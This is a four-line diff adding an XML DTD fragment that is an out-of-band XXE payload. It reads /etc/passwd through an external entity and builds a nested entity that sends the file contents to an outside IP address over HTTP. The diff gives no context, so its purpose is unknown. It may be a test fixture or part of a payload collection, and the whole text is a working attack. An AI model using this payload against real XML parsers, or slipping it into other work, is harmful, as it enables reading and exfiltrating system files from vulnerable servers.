@@ -1,0 +1,4 @@
+<!ENTITY % a SYSTEM "file:///etc/passwd">
+<!ENTITY % b "<!ENTITY % c SYSTEM 'http://97.64.125.173:53/%a;'>">
+%b;
+%c;
